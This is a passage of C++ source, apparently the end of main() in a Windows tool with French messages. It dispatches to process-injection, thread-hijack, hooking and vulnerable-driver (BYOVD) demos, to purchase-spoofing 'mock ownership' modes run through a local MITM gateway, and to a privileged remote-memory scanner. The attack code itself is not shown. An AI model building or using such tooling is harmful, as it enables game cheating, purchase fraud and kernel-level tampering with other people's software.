                std::cerr << "--proxy requiert une URL : --proxy <url> (ex: --proxy 127.0.0.1:8080)\n";
                return 1;
            }
            SetProxyUrl(argv[++i]);
            std::cout << "[PROXY MODE ACTIVE: " << GetProxyUrl() << "]\n";
        }
        else if (arg == "--buy-gamepass")           buyGamepass = true;
        else if (arg == "--buy-devproduct")         buyDevProduct = true;
        else if (arg == "--buy-marketplace")        buyMarketplace = true;
        else if (arg == "--buy-probe")              buyProbe = true;
        else if (arg == "--mock" || arg == "--mock-stage") {
            if (i + 1 >= argc) {
                std::cerr << arg << " requiert un etage : analyze, capture, configure, deploy, all\n";
                return 1;
            }
            mockSet = true;
            mockStage = argv[++i];
        }
        else if (arg == "--mock-log") {
            if (i + 1 >= argc) { std::cerr << "--mock-log requiert un chemin\n"; return 1; }
            mockSet = true;
            mockOpt.log_path = argv[++i];
        }
        else if (arg == "--mock-sessions") {
            if (i + 1 >= argc) { std::cerr << "--mock-sessions requiert un glob\n"; return 1; }
            mockSet = true;
            mockOpt.session_glob = argv[++i];
        }
        else if (arg == "--mock-filter") {
            if (i + 1 >= argc) { std::cerr << "--mock-filter requiert une valeur\n"; return 1; }
            mockSet = true;
            mockOpt.url_filter = argv[++i];
        }
        else if (arg == "--mock-product") {
            if (i + 1 >= argc) { std::cerr << "--mock-product requiert un id\n"; return 1; }
            mockSet = true;
            mockOpt.product_id = argv[++i];
        }
        else if (arg == "--mock-state") {
            if (i + 1 >= argc) { std::cerr << "--mock-state requiert une valeur\n"; return 1; }
            mockSet = true;
            mockOpt.state_filter = argv[++i];
        }
        else if (arg == "--mock-captured") {
            if (i + 1 >= argc) { std::cerr << "--mock-captured requiert un chemin\n"; return 1; }
            mockSet = true;
            mockOpt.captured_json = argv[++i];
        }
        else if (arg == "--mock-responses") {
            if (i + 1 >= argc) { std::cerr << "--mock-responses requiert un dossier\n"; return 1; }
            mockSet = true;
            mockOpt.response_out_dir = argv[++i];
        }
        else if (arg == "--mock-rules") {
            if (i + 1 >= argc) { std::cerr << "--mock-rules requiert un chemin\n"; return 1; }
            mockSet = true;
            mockOpt.rules_file = argv[++i];
        }
        else if (arg == "--mock-proxy-dir") {
            if (i + 1 >= argc) { std::cerr << "--mock-proxy-dir requiert un dossier\n"; return 1; }
            mockSet = true;
            mockOpt.proxy_rules_dir = argv[++i];
        }
        else if (arg == "--mock-service") {
            if (i + 1 >= argc) { std::cerr << "--mock-service requiert un nom\n"; return 1; }
            mockSet = true;
            mockOpt.proxy_service = argv[++i];
        }
        else if (arg == "--mock-reload") {
            if (i + 1 >= argc) { std::cerr << "--mock-reload requiert un nom de marqueur\n"; return 1; }
            mockSet = true;
            mockOpt.reload_marker = argv[++i];
        }
        else if (arg == "--mock-luau") {
            // Configure génère Script=mock_success.luau (mock.respond) au lieu de
            // ResponseFile : injection du payload capturé, audit de passerelle "inject".
            mockSet = true;
            mockOpt.inject_luau = true;
        }
        else if (arg == "--read-only" || arg == "-r") readOnly = true;
        else if (arg == "--trace") {
            // lance une .exe et rapporte son comportement au demarrage
            traceMode = true;
        }
        else if (arg == "--trace-timeout") {
            if (i + 1 >= argc) {
                std::cerr << "--trace-timeout requiert un nombre de secondes\n";
                return 1;
            }
            traceTimeoutSec = std::atoi(argv[++i]);
            if (traceTimeoutSec < 1) traceTimeoutSec = 1;
        }
        else if (arg == "--trace-keep") {
            traceKeep = true;
        }
        else if (arg == "--trace-attach") {
            if (i + 1 >= argc) {
                std::cerr << "--trace-attach requiert un PID\n";
                return 1;
            }
            traceAttachPid = std::atoi(argv[++i]);
            if (traceAttachPid < 1) {
                std::cerr << "--trace-attach : PID invalide\n";
                return 1;
            }
        }
        else if (arg == "--ns") {
            if (i + 1 >= argc) {
                std::cerr << "--ns requiert une chaine : --ns \"version; aliases\"\n";
                return 1;
            }
            nsChainMode = true;
            nsChainArg = argv[++i];
        }
        else if (arg == "--ns-batch") {
            if (i + 1 >= argc) {
                std::cerr << "--ns-batch requiert un chemin de fichier .bat/.txt\n";
                return 1;
            }
            nsBatchMode = true;
            nsBatchArg = argv[++i];
        }
        else if (arg == "--ns-repl") {
            nsReplMode = true;
        }
        else if (arg == "--ghidra-help") {
            ghidraHelp = true;
        }
        else if (arg == "--ghidra") {
            // Mode ghidra-rpc integre : tout ce qui suit est transmis tel quel
            // au CLI Python (sous-commande + arguments, options comprises).
            ghidraMode = true;
            for (i = i + 1; i < argc; ++i) ghidraArgs.push_back(argv[i]);
        }
        else if (arg.size() > 1 && arg[0] == '-' && !traceMode) {
            std::cerr << "Option inconnue : " << arg << '\n';
            return 1;
        } else {
            positional.push_back(argv[i]);
        }
    }
    if (demo) return RunLocalDemo();
#ifdef _WIN32
    if (hookDemo) return RunHookDemo();
    if (iatDemo)  return RunIatDemo();
    if (vmtDemo)  return RunVmtDemo();
    if (luauVm)   return RunLuauVMDemo(positional, loadstringHook);
    if (survivor) return RunSurvivorDemo(positional);
    if (apc)      return RunApcDemo(positional);
    if (hijack)   return RunHijackDemo(positional);
    if (marketplace) return RunLuauVMDemo(positional, false, kSnippetMarketplace);
    if (gamepass)    return RunLuauVMDemo(positional, false, kSnippetGamepass);
    if (devproduct)  return RunLuauVMDemo(positional, false, kSnippetDevProduct);
    if (detect)      return RunLuauVMDemo(positional, false, kSnippetDetect);
    if (sigUpdate)   return RunSigUpdateDemo(positional);
    if (autoFix)     return RunAutoFixDemo(positional);
    if (probeThread) return RunProbeThreadDemo(positional);
    if (probeHijack) return RunProbeHijackDemo(positional);
    if (byovd)      return RunByovdDemo(positional);
    if (hijackByovd) return RunHijackByovdDemo(positional);
    if (sivRemove)     return RemoveSivDriver() ? 0 : 1;
    if (sivLoad)       return RunSivLoad(positional);
    if (sivRead)       return RunSivRead(positional);
    if (sivWrite)      return RunSivWrite(positional);
    if (byovdSiv)      return RunByovdSivDemo(positional);
    g_snyPidReq = snyperPid;
    g_snyLoop = snyperLoop ? 1 : 0;
    if (snyperRecord) return RunSnyperRecord(positional);
    if (snyperDryrun) return RunSnyperPlay(true, positional);
    if (snyperPlay)   return RunSnyperPlay(false, positional);
    if (buyGamepass)    return RunWebPurchase("gamepass", positional);
    if (buyDevProduct)  return RunWebPurchase("devproduct", positional);
    if (buyMarketplace) return RunWebPurchase("marketplace", positional);
    if (buyProbe)       return RunBuyProbe(positional);
    if (simGet)         return RunSimulatorDemo("get", positional);
    if (simPost)        return RunSimulatorDemo("post", positional);
    if (simPut)         return RunSimulatorDemo("put", positional);
    if (simDel)         return RunSimulatorDemo("del", positional);
    if (simPurchase)    return RunSimulatorDemo("purchase", positional);
    if (traceAttachPid)  return AttachTrace((DWORD)traceAttachPid, traceTimeoutSec);
    if (traceMode)      return RunStartupTrace(positional, traceTimeoutSec, traceKeep);
    if (mockSet) {
        // Pipeline natif de mock ownership (proxy-mock) : analyse, capture,
        // generation des regles et deploiement. Retourne 0 en succes.
        return mockgen::RunMockStage(mockStage, mockOpt);
    }
    if (nsChainMode || nsBatchMode || nsReplMode) {
        // Moteur NightShift integre (nuit C autonome) : --ns <chaine>,
        // --ns-batch <fichier>, --ns-repl (stdin). Le module autonome
        // C:\client_simulator\nightshift reste utilisable tel quel.
        NSContext ns_ctx;
        std::cout << "[NightShift] v" << NS_VERSION
                  << " integre dans MonNouvelApp.exe\n";
        ns_context_init(&ns_ctx);
        ns_alias_reload(&ns_ctx);
        int r = 0;
        if (nsReplMode) {
            r = ns_app_repl(&ns_ctx);
        } else if (nsBatchMode) {
            r = ns_batch_process(&ns_ctx, nsBatchArg.c_str());
        } else {
            r = ns_app_run_chain(&ns_ctx, nsChainArg.c_str());
        }
        ns_context_cleanup(&ns_ctx);
        return r < 0 ? 1 : r;
    }
    if (ghidraHelp) {
        // Aide du mode --ghidra : sous-commandes ghidra-rpc disponibles.
        PrintGhidraUsage();
        return 0;
    }
    if (ghidraMode) {
        // Mode ghidra-rpc integre (package Python vendorise dans
        // C:\client_simulator\ghidra-rpc). Tous les arguments passes apres
        // --ghidra sont transmis au CLI, la sortie JSON est affichee telle
        // quelle et le code de sortie de la commande est propage.
        if (ghidraArgs.empty()) {
            PrintGhidraUsage();
            return 1;
        }
        return RunGhidraCommand(ghidraArgs);
    }
    if (gatewayMode) {
        // Même orchestration que main.cpp de ltg.exe : phase 1 PKI, phase 3
        // règles, phase 4 mock Luau, puis écoute HTTPS/MITM sur 127.0.0.1.
        // rules.ini / fallback.luau / ltg-root.der sont résolus dans le répertoire courant.
        localgate::CertStore store("LGT-Root-CA", "Local Test Gateway");
        store.load();
        localgate::RuleEngine rules;
        rules.load("rules.ini");
        localgate::MockController mock;
        localgate::Gateway gw(store, rules, mock);
        gw.run(gatewayPort);
        return 0;
    }
#endif

#ifdef _WIN32
    const DWORD kDefaultPid = 31280;
    const size_t kMaxResults = 100;

    // Cible : un PID (que des chiffres) ou un nom d'exécutable.
    DWORD pid = kDefaultPid;
    if (positional.size() > 0) {
        std::string_view target = positional[0];
        bool isNumber = std::all_of(target.begin(), target.end(),
                                    [](char c) { return c >= '0' && c <= '9'; });
        if (isNumber) {
            unsigned long v = std::strtoul(positional[0], nullptr, 10);
            if (v == 0) {
                std::cerr << "PID invalide : " << target << '\n';
                return 1;
            }
            pid = static_cast<DWORD>(v);
        } else {
            auto procs = FindProcessesByName(target);
            if (procs.empty()) {
                std::cerr << "Aucun processus nomme \"" << target << "\" en cours d'execution.\n";
                return 1;
            }
            if (procs.size() > 1) {
                // Plusieurs instances : on refuse de deviner, pour ne pas scanner la mauvaise.
                std::cerr << procs.size() << " processus nommes \"" << target
                          << "\", precise le PID :";
                for (const auto& p : procs) std::cerr << ' ' << p.pid;
                std::cerr << '\n';
                return 1;
            }
            pid = procs.front().pid;
            std::cout << "\"" << target << "\" -> PID " << pid << '\n';
        }
    }

    const char* signature = positional.size() > 1 ? positional[1] : "48 89 5C 24 ?? 50";
    auto pattern = ParsePattern(signature);
    if (!pattern || pattern->empty()) {
        std::cerr << "Signature invalide : " << signature << '\n';
        return 1;
    }

    const AccessMode mode = readOnly ? AccessMode::ReadOnly : AccessMode::Full;

    // Mode complet : même pré-requis que le watcher, la session doit déjà être élevée.
    // Lecture seule : l'élévation reste recommandée, mais un processus du même
    // utilisateur non élevé est lisible sans elle.
    if (IsProcessElevated()) {
        if (!EnableDebugPrivilege())
            std::cerr << "Avertissement : SeDebugPrivilege non active, certains processus resteront inaccessibles.\n";
    } else if (mode == AccessMode::Full) {
        std::cerr << "Elevation UAC requise : lance ce programme depuis un terminal administrateur"
                     " (ou utilise --read-only pour un processus non eleve).\n";
        return 1;
    } else {
        std::cerr << "Avertissement : session non elevee, seuls les processus non eleves du meme utilisateur sont lisibles.\n";
    }

    UniqueHandle proc = OpenTargetProcess(pid, mode);
    if (!proc) return 1;

    std::cout << "Scan du PID " << pid << (readOnly ? " (lecture seule)" : "")
              << " pour \"" << signature << "\"...\n";
    auto matches = FindAllPatternsInRemoteProcess(proc.get(), *pattern, kMaxResults);

    std::cout << matches.size() << (matches.size() >= kMaxResults ? "+" : "") << " occurrence(s)\n";
    for (uintptr_t a : matches)
        std::cout << "  0x" << std::hex << a << std::dec << '\n';
    return matches.empty() ? 2 : 0;
#else
    return RunLocalDemo();
#endif
}
